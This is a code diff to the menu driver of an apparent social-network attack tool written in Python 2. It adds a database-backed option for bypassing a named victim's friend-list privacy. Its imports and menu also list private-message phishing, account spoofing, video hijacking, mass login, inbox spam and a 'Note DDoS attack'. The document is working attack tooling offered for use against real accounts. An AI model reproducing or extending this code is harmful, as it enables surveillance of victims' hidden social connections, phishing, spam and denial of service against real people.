@@ -1,5 +1,5 @@
-from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest
-from database import connect,status
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase
+from database import connect,status, checkTableExistence, createVictimTable
 from time import time
 import signal
 from handlers import *
@@ -59,7 +59,8 @@ def main():
                (int(option) != 19) and (int(option) != 20) and
                (int(option) != 21) and (int(option) != 22) and 
                (int(option) != 23) and (int(option) != 24) and
-               (int(option) != 25) and (int(option) != 26)):
+               (int(option) != 25) and (int(option) != 26) and
+               (int(option) != 27)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -87,7 +88,8 @@ def main():
             print '23) Note DDoS attack\n'
             print '24) Old Like Flood (Not working)\n'
             print '25) NEW! SPAM any fanpage inbox\n'
-            print '26) Close the application\n'
+            print '26) Bypass - database support (Beta) \n '
+            print '27) Close the application\n'
 
             
             choice = raw_input('Insert your choice: ')
@@ -479,10 +481,30 @@ def main():
             page = raw_input('Insert the fan page name or id: ')
             message = raw_input('Insert the message to send: ')
             massMessage(page, message)
-                        
-        if (int(option) == 26):
-            connect.close()
 
+        if (int(option) == 26):
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword             
+            if (login(email,password,'real'))!= -1:
+                victim = raw_input('Insert the victim username or userId: ')
+                if ( checkTableExistence(victim) != True):
+                    if (createVictimTable(victim) != -1):
+                        check = checkPrivacy(victim)
+                        if (check == -1):
+                            transitive = raw_input('Insert the transitive username or userId: ')
+                            dotFileDatabase(victim, transitive)
+                            plotDOT(victim)    
+                        else:
+                            print 'Friends publicly available ;D'
+                            friendList, friendsName = friendshipPlot(check,victim)
+                            simpleDotGraphDatabase(friendsName, victim)
+                            plotDOT(victim)
+
+        if (int(option) == 27):
+            connect.close()          
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
             print ' _    _            _      _______ _            _____  _                  _   _  '
